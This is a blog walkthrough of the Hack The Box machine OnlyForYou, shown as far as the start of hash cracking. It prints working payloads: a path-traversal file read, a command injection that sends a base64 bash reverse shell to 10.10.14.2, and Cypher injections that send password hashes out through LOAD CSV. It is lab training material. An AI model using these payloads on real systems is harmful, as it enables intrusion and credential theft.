---
layout: post
title: Hack The Box Walkthrough - OnlyForYou
date: 2023-08-26
type: post
tags:
- Walkthrough
- Hacking
- HackTheBox
- Medium
- Machine
permalink: /2023/08/HTB/OnlyForYou
img: 2023/08/OnlyForYou/OnlyForYou.png
---

OnlyForYou was a very fun box. I had to exploit a file read vulnerability, a Remote Command Injection, and a Cypher Injection to get the user flag. Then I had to use pip with a local repository to finally get root.

* Room: OnlyForYou
* Difficulty: Medium
* URL: [https://app.hackthebox.com/machines/OnlyForYou](https://app.hackthebox.com/machines/OnlyForYou)
* Author: [0xM4hm0ud](https://app.hackthebox.com/users/480031)

## Open Ports

I began the machine by scanning for open ports with Rustscan.

```bash
 rustscan -a target -- -A | tee rust.txt
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
 😵 https://admin.tryhackme.com
[~] The config file is expected to be at "/home/ehogue/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.
Open 10.10.11.210:22
Open 10.10.11.210:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-30 16:52 EDT
NSE: Loaded 155 scripts for scanning.

...

Host is up, received syn-ack (0.049s latency).
Scanned at 2023-04-30 16:52:43 EDT for 7s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e883e0a9fd43df38198aaa35438411ec (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDX7r34pmJ6U9KrHg0/WDdrofcOXqTr13Iix+3D5ChuYwY2fmqIBlfuDo0Cz0xLnb/jaT3ODuDtmAih6unQluWw3RAf03l/tHxXfvXlWBE3I7uDu+roHQM7+hyShn+559JweJlofiYKHjaErMp33DI22BjviMrCGabALgWALCwjqaV7Dt6ogSllj+09trFFwr2xz
zrqhQVMdUdljle99R41Hzle7QTl4maonlUAdd2Ok41ACIu/N2G/iE61snOmAzYXGE8X6/7eqynhkC4AaWgV8h0CwLeCCMj4giBgOo6EvyJCBgoMp/wH/90U477WiJQZrjO9vgrh2/cjLDDowpKJDrDIcDWdh0aE42JVAWuu7IDrv0oKBLGlyznE1eZsX2u1FH8EGYXkl58GrmFbyIT83HsXjF1+rapAUtG0Zi9JskF/
DPy5+1HDWJShfwhLsfqMuuyEdotL4Vzw8ZWCIQ4TVXMUwFfVkvf410tIFYEUaVk5f9pVVfYvQsCULQb+/uc=
|   256 83f235229b03860c16cfb3fa9f5acd08 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAz/tMC3s/5jKIZRgBD078k7/6DY8NBXEE8ytGQd9DjIIvZdSpwyOzeLABxydMR79kDrMyX+vTP0VY5132jMo5w=
|   256 445f7aa377690a77789b04e09f11db80 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOqatISwZi/EOVbwqfFbhx22EEv6f+8YgmQFknTvg0wr
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://only4you.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:52
Completed NSE at 16:52, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:52
Completed NSE at 16:52, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:52
Completed NSE at 16:52, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.78 seconds
```

There were two open ports.
* 22 (SSH)
* 80 (HTTP)

I also scanned for UDP ports, but nothing came up.

The website on port 80 was redirecting to 'only4you.htb'. I added the domain to my hosts files and scanned it with Feroxbuster.

```bash
$ feroxbuster -u http://only4you.htb -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -o ferox.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.5
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://only4you.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.5
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       37l       58w      674c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      274l      604w     6492c http://only4you.htb/static/js/main.js
200      GET      159l      946w    71778c http://only4you.htb/static/img/team/team-1.jpg
200      GET        9l      155w     5417c http://only4you.htb/static/vendor/purecounter/purecounter_vanilla.js
200      GET       96l      598w    48920c http://only4you.htb/static/img/team/team-4.jpg
200      GET        7l       27w     3309c http://only4you.htb/static/img/apple-touch-icon.png
200      GET        9l       23w      847c http://only4you.htb/static/img/favicon.png
200      GET        1l      218w    26053c http://only4you.htb/static/vendor/aos/aos.css
200      GET       13l      171w    16466c http://only4you.htb/static/vendor/swiper/swiper-bundle.min.css
200      GET       88l      408w    36465c http://only4you.htb/static/img/testimonials/testimonials-4.jpg
200      GET        7l     1225w    80457c http://only4you.htb/static/vendor/bootstrap/js/bootstrap.bundle.min.js
200      GET       71l      380w    30729c http://only4you.htb/static/img/testimonials/testimonials-3.jpg
200      GET        1l      313w    14690c http://only4you.htb/static/vendor/aos/aos.js
200      GET       12l      557w    35445c http://only4you.htb/static/vendor/isotope-layout/isotope.pkgd.min.js
200      GET      244l     1332w   103224c http://only4you.htb/static/img/testimonials/testimonials-2.jpg
200      GET      172l     1093w    87221c http://only4you.htb/static/img/team/team-2.jpg
200      GET       90l      527w    40608c http://only4you.htb/static/img/testimonials/testimonials-5.jpg
200      GET        1l      233w    13749c http://only4you.htb/static/vendor/glightbox/css/glightbox.min.css
200      GET     1876l     9310w    88585c http://only4you.htb/static/vendor/bootstrap-icons/bootstrap-icons.css
200      GET       14l     1683w   143281c http://only4you.htb/static/vendor/swiper/swiper-bundle.min.js
200      GET     2317l    11522w   110438c http://only4you.htb/static/vendor/remixicon/remixicon.css
200      GET        1l      625w    55880c http://only4you.htb/static/vendor/glightbox/js/glightbox.min.js
200      GET      160l      818w    71959c http://only4you.htb/static/img/testimonials/testimonials-1.jpg
200      GET     1936l     3839w    34056c http://only4you.htb/static/css/style.css
200      GET      112l      805w    65527c http://only4you.htb/static/img/team/team-3.jpg
200      GET        1l      133w    66571c http://only4you.htb/static/vendor/boxicons/css/boxicons.min.css
200      GET      673l     2150w    34125c http://only4you.htb/
200      GET        7l     2208w   195498c http://only4you.htb/static/vendor/bootstrap/css/bootstrap.min.css
[####################] - 3m    119651/119651  0s      found:27      errors:0
[####################] - 3m    119601/119601  674/s   http://only4you.htb/
```

It found a bunch of static pages, nothing very interesting. I also used wfuzz to search for subdomains.

```bash
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -X POST -t30 --hw 12 -H "Host:FUZZ.only4you.htb" "http://only4you.htb"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://only4you.htb/
Total requests: 648201

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000063403:   405        36 L     59 W       683 Ch      "beta"

Total time: 738.5702
Processed Requests: 648201
Filtered Requests: 648200
Requests/sec.: 877.6429
```

It found one subdomain, I added it to my hosts file.

## Main Site

I opened a browser and looked at the site on 'only4you.htb'.

![Main Site](/assets/images/2023/08/OnlyForYou/MainSite.png "Main Site")

There was not much to the site. There was a contact form, but when I tried it, I got an authorization error.

![Not Authorized](/assets/images/2023/08/OnlyForYou/NotAuthorized.png "Not Authorized")

There was also a link to 'beta.only4you.htb' in the Frequently Asked Questions section.

## Code Analysis

I clicked on the link to the beta site.

![Beta Site](/assets/images/2023/08/OnlyForYou/BetaSite.png "Beta Site")

There was a button to download the site source code. I downloaded it. But I still went through the site before looking at the code.

The site had functionalities to resize and convert images.

![Image Resizer](/assets/images/2023/08/OnlyForYou/ImageResizer.png "Image Resizer")
![Image Converter](/assets/images/2023/08/OnlyForYou/ImageConverter.png "Image Converter")

I tried uploading code, but the site only accepted JPG and PNG files. I had the source code, so I opened it to try and find some flaws in it.

### Image Transformations

I looked at the code that transformed the images.

```python
@app.route('/resize', methods=['POST', 'GET'])
def resize():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('Something went wrong, Try again!', 'danger')
            return redirect(request.url)
        file = request.files['file']
        img = secure_filename(file.filename)
        if img != '':
            ext = os.path.splitext(img)[1]
            if ext not in app.config['UPLOAD_EXTENSIONS']:
                flash('Only png and jpg images are allowed!', 'danger')
                return redirect(request.url)
            file.save(os.path.join(app.config['RESIZE_FOLDER'], img))
            status = resizeimg(img)
            if status == False:
                flash('Image is too small! Minimum size needs to be 700x700', 'danger')
                return redirect(request.url)
            else:
                flash('Image is succesfully uploaded!', 'success')
        else:
            flash('No image selected!', 'danger')
            return redirect(request.url)
        return render_template('resize.html', clicked="True"), {"Refresh": "5; url=/list"}
    else:
        return render_template('resize.html', clicked="False")
```

The code for both resizing and converting images was pretty similar. It used [secure_filename](https://tedboy.github.io/flask/generated/werkzeug.secure_filename.html) to protect against attacks. The calls to `os.path.join` looked interesting. I knew from doing [OpenSource](/2022/10/HTB/OpenSource) that this method could be exploited by passing it an absolute path. However, the call to `secure_filename` protected the application against that exploit.

### Download

When the application resized and image, it displayed page with the list of produced images. This paged allowed to download the different sizes the original image was transformed into.

```python
@app.route('/download', methods=['POST'])
def download():
    image = request.form['image']
    filename = posixpath.normpath(image)
    if '..' in filename or filename.startswith('../'):
        flash('Hacking detected!', 'danger')
        return redirect('/list')
    if not os.path.isabs(filename):
        filename = os.path.join(app.config['LIST_FOLDER'], filename)
    try:
        if not os.path.isfile(filename):
            flash('Image doesn\'t exist!', 'danger')
            return redirect('/list')
    except (TypeError, ValueError):
        raise BadRequest()
    return send_file(filename, as_attachment=True)
```

This function was not using `secure_filename`. Instead it called `posixpath.normpath` and looked for `..` in the filename, or `../` at the begining of the filename. Then if the path was absolute, it would pass it to `os.path.join`. When this method gets a part that starts with a `/`, it ignores everything that came before. So if I passed an absolute filename the `LIST_FOLDER` would be ignored.

I tried to download `/etc/passwd`.

```http
POST /download HTTP/1.1
Host: beta.only4you.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 17
Origin: http://beta.only4you.htb
Connection: close
Referer: http://beta.only4you.htb/list
Upgrade-Insecure-Requests: 1

image=/etc/passwd
```

It worked.

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 06 May 2023 14:52:21 GMT
Content-Type: application/octet-stream
Content-Length: 2079
Connection: close
Content-Disposition: attachment; filename=passwd
Last-Modified: Thu, 30 Mar 2023 12:12:20 GMT
Cache-Control: no-cache
ETag: "1680178340.2049809-2079-393413677"

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
john:x:1000:1000:john:/home/john:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
neo4j:x:997:997::/var/lib/neo4j:/bin/bash
dev:x:1001:1001::/home/dev:/bin/bash
fwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:996:996::/var/log/laurel:/bin/false
```

I tried to use that to read files in `/proc/self`, it returned no data. I used the vulnerability to download the nginx configuration.

```
server {
    listen 80;
    return 301 http://only4you.htb$request_uri;
}

server {
	listen 80;
	server_name only4you.htb;

	location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/only4you.htb/only4you.sock;
	}
}

server {
	listen 80;
	server_name beta.only4you.htb;

        location / {
                include proxy_params;
                proxy_pass http://unix:/var/www/beta.only4you.htb/beta.sock;
        }
}
```

I already had the code for the beta application. I used the vulnerability to extract the code from the application on the main domain.

```
image=/var/www/only4you.htb/app.py
```

```python
from flask import Flask, render_template, request, flash, redirect
from form import sendmessage
import uuid

app = Flask(__name__)
app.secret_key = uuid.uuid4().hex

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        email = request.form['email']
        subject = request.form['subject']
        message = request.form['message']
        ip = request.remote_addr

        status = sendmessage(email, subject, message, ip)
        if status == 0:
            flash('Something went wrong!', 'danger')
        elif status == 1:
            flash('You are not authorized!', 'danger')
        else:
            flash('Your message was successfuly sent! We will reply as soon as possible.', 'success')
        return redirect('/#contact')
    else:
        return render_template('index.html')

  ...

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=80, debug=False)
```

The `/` route had the code for the Contact form. It used the function `sendmessage` imported from `form`. I extracted that code also.

```
image=/var/www/only4you.htb/form.py
```

```python
import smtplib, re
from email.message import EmailMessage
from subprocess import PIPE, run
import ipaddress

def issecure(email, ip):
	if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
		return 0
	else:
		domain = email.split("@", 1)[1]
		result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
		output = result.stdout.decode('utf-8')
		if "v=spf1" not in output:
			return 1
		else:
			domains = []
			ips = []
			if "include:" in output:
				dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
				dms.pop(0)
				for domain in dms:
					domains.append(domain)
				while True:
					for domain in domains:
						result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
						output = result.stdout.decode('utf-8')
						if "include:" in output:
							dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
							domains.clear()
							for domain in dms:
								domains.append(domain)
						elif "ip4:" in output:
							ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
							ipaddresses.pop(0)
							for i in ipaddresses:
								ips.append(i)
						else:
							pass
					break
			elif "ip4" in output:
				ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
				ipaddresses.pop(0)
				for i in ipaddresses:
					ips.append(i)
			else:
				return 1
		for i in ips:
			if ip == i:
				return 2
			elif ipaddress.ip_address(ip) in ipaddress.ip_network(i):
				return 2
			else:
				return 1

def sendmessage(email, subject, message, ip):
	status = issecure(email, ip)
	if status == 2:
		msg = EmailMessage()
		msg['From'] = f'{email}'
		msg['To'] = 'info@only4you.htb'
		msg['Subject'] = f'{subject}'
		msg['Message'] = f'{message}'

		smtp = smtplib.SMTP(host='localhost', port=25)
		smtp.send_message(msg)
		smtp.quit()
		return status
	elif status == 1:
		return status
	else:
		return status
```

There is a Remote Code Execution (RCE) vulnerability at the beginning of the file. I spotted it right away so I didn't have to read most of the code. When a message is sent, the code calls `issecure` to validate the email and IP of the sender. It starts by validating the format of the email with a regular expression. If the email is valid, it the uses dig to get the TXT records for the domain of the email address.

```python
def issecure(email, ip):
	if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
		return 0
	else:
		domain = email.split("@", 1)[1]
		result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
```

The regular expression validates that the email as all the needed parts, and limit the characters that can be used. But it does not have anchors for the beginning and end of the string. I could add things that were not a valid email at the beginning or the end of the email address.

The dig command used everything that came after the '@' in the email address. I tried adding a second command at the end of my email.


```http
POST / HTTP/1.1
Host: only4you.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Origin: http://only4you.htb
Connection: close
Referer: http://only4you.htb/
Upgrade-Insecure-Requests: 1

name=Eric&email=test%40test.com;wget 10.10.14.2&subject=Test&message=Test
```

I started a web server before posting my payload. It got a hit.

```bash
$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.210 - - [06/May/2023 11:30:50] "GET / HTTP/1.1" 200 -
```

I knew I could execute code on the server. I created a payload to get a reverse shell. I encoded it in base64 to avoid having special characters.

```bash
$ echo 'bash  -i >& /dev/tcp/10.10.14.2/4444  0>&1  ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMi80NDQ0ICAwPiYxICAK
```

Then I started a netcat listener and sent the payload with the email address.

```http
POST / HTTP/1.1
Host: only4you.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Origin: http://only4you.htb
Connection: close
Referer: http://only4you.htb/
Upgrade-Insecure-Requests: 1

name=Eric&email=test%40test.com;echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMi80NDQ0ICAwPiYxICAK | base64 -d | bash&subject=Test&message=Test
```

I got the reverse shell.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.210] 45074
bash: cannot set terminal process group (1012): Inappropriate ioctl for device
bash: no job control in this shell
www-data@only4you:~/only4you.htb$
```

## Getting John

Once connected on the server, I solidified my shell and started looking for escalation. I  could not run sudo, I did not see any suspicious suid binaries, and I did not find any capabilities I could exploit.

The `/opt` folder had two interesting subfolders, but I could not read them.

```bash
www-data@only4you:~/only4you.htb$ ls -l /opt/
total 8
drwxr----- 6 dev dev 4096 May  6 15:40 gogs
drwxr----- 6 dev dev 4096 Mar 30 11:51 internal_app
```

I looked for ports that were only open on localhost.

```bash
www-data@only4you:~/only4you.htb$ ss -tunl
Netid                  State                   Recv-Q                  Send-Q                                          Local Address:Port                                      Peer Address:Port                  Process
udp                    UNCONN                  0                       0                                               127.0.0.53%lo:53                                             0.0.0.0:*
udp                    UNCONN                  0                       0                                                     0.0.0.0:68                                             0.0.0.0:*
tcp                    LISTEN                  0                       4096                                            127.0.0.53%lo:53                                             0.0.0.0:*
tcp                    LISTEN                  0                       128                                                   0.0.0.0:22                                             0.0.0.0:*
tcp                    LISTEN                  0                       4096                                                127.0.0.1:3000                                           0.0.0.0:*
tcp                    LISTEN                  0                       2048                                                127.0.0.1:8001                                           0.0.0.0:*
tcp                    LISTEN                  0                       70                                                  127.0.0.1:33060                                          0.0.0.0:*
tcp                    LISTEN                  0                       151                                                 127.0.0.1:3306                                           0.0.0.0:*
tcp                    LISTEN                  0                       511                                                   0.0.0.0:80                                             0.0.0.0:*
tcp                    LISTEN                  0                       128                                                      [::]:22                                                [::]:*
tcp                    LISTEN                  0                       4096                                       [::ffff:127.0.0.1]:7687                                                 *:*
tcp                    LISTEN                  0                       50                                         [::ffff:127.0.0.1]:7474                                                 *:*
```

Ports 7687 and 7474 are used by [Neo4j](https://neo4j.com/docs/operations-manual/current/configuration/ports/), I tried connecting to it, but I was not allowed.

```bash
www-data@only4you:~/only4you.htb$ neo4j
/usr/bin/neo4j: line 8: /usr/share/neo4j/bin/neo4j: Permission denied
/usr/bin/neo4j: line 8: exec: /usr/share/neo4j/bin/neo4j: cannot execute: Permission denied
```

### Gogs

I found ports 3000 and 8001. To access them, I downloaded [Chisel](https://github.com/jpillora/chisel) on the box and used it to create a reverse tunnel.

I launched the server on my machine.

```bash
./chisel server -p 3477 --reverse
```

Then on the server I created the reverse tunnel on port 3000.

```bash
./chisel client 10.10.14.2:3477 R:3000:localhost:3000/tcp
```

I opened `localhost:3000` in my browser.

![Gogs](/assets/images/2023/08/OnlyForYou/Gogs.png "Gogs")

It was an installation of [Gogs](https://gogs.io/). I could see two users (john and administrator), but no public repository. In [Health](https://erichogue.ca/2023/01/HTB/Health) I exploited an SQL Injection vulnerability in an old version of Gogs. The version on this box did not display the version, and it did not look as old. But I tried the SQL Injection anyway. It failed.

I found another vulnerability, but it required to be authenticated. I tried to log in as john and administrator using simple passwords, that also failed.

### Private Application

I recreate a Chisel reverse tunnel on port 8001.

![Private Application](/assets/images/2023/08/OnlyForYou/PrivateApp.png "Private Application")

This application redirected me to a login page. I scanned it with Feroxbuster.

```bash
$ feroxbuster -u http://localhost:8001/

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.5
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://localhost:8001/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.5
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       37l       58w      674c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       66l      150w     2554c http://localhost:8001/login
302      GET        5l       22w      199c http://localhost:8001/profile => http://localhost:8001/login
302      GET        5l       22w      199c http://localhost:8001/ => http://localhost:8001/login
405      GET       37l       59w      683c http://localhost:8001/logout
405      GET       37l       59w      683c http://localhost:8001/update
405      GET       37l       59w      683c http://localhost:8001/search
302      GET        5l       22w      199c http://localhost:8001/dashboard => http://localhost:8001/login
302      GET        5l       22w      199c http://localhost:8001/employees => http://localhost:8001/login
[#>------------------] - 8m     11389/119604  69m     found:8       errors:350
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_localhost:8001_-1683390957.state ...
[#>------------------] - 8m     11390/119604  69m     found:8       errors:350
[#>------------------] - 8m     11379/119601  25/s    http://localhost:8001/
[--------------------] - 0s         0/119601  -       http://localhost:8001/login
```

It did not find anything I could use. I tried the same credentials I had tried in Gogs. They didn't work here either. I tried admin/admin, that worked.

![Dashboard](/assets/images/2023/08/OnlyForYou/Dashboard.png "Dashboard")

The dashboard did not have much, but the Employees page allowed search for employees.

![Employees](/assets/images/2023/08/OnlyForYou/Employees.png "Employees")

I tried SQL and NoSQL injection. They both failed, but sending a `'` gave me an error. I remembered seeing Neo4j on the server. I never did injection in Neo4j. But a quick search gave me a nice [cheatsheet on Cypher Injection](https://pentester.land/blog/cypher-injection-cheatsheet/). And as usual [HackTricks](https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j) also had lots of information.

I read both pages and started trying to exploit it. I quickly found a payload that seemed to confirm I could inject it.

```http
POST /search HTTP/1.1
Host: localhost:8001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://localhost:8001
Connection: close
Referer: http://localhost:8001/employees
Cookie: lang=en-US; session=9d9ed6dc-9c64-4f25-834d-77492f56aa71
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

search=' or 1 = '1
```

It returned all the employees. I also got it to work with string concatenation.

```
search=Jh'%2b'on
```

I had a hard time to go further than that. I kept focussing on trying to avoid having a 500 returned by the application. Eventually I realized that it did not matter. I sent a payload to load some CSV from my machine.

```
search=Sarah' CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.14.3' as b RETURN b//
```

This gave me an error, but I got a request on my web server.

I tried getting the labels.

```
search=Sarah' CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.14.3/?label='%2blabel as b RETURN b//
```

I got two.

```
10.10.11.210 - - [07/May/2023 09:05:32] "GET /?label=user HTTP/1.1" 200 -
10.10.11.210 - - [07/May/2023 09:05:32] "GET /?label=employee HTTP/1.1" 200 -
```

With a little more exploration, I got it to send me the user's data.

```
search=Sarah' WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.3/?'%2bp%2b'='%2btoString(f[p]) as b RETURN b//
```

```
10.10.11.210 - - [07/May/2023 09:32:46] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
10.10.11.210 - - [07/May/2023 09:32:46] "GET /?username=admin HTTP/1.1" 200 -
10.10.11.210 - - [07/May/2023 09:32:47] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
10.10.11.210 - - [07/May/2023 09:32:47] "GET /?username=john HTTP/1.1" 200 -
```

I had two passwords. I knew that admin's password was admin, but I added them both to a text file anyway. And I used hashcat to crack them.

```bash
$ hashcat -a0 -m1400 --username hash.txt /usr/share/seclists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 2862/5789 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
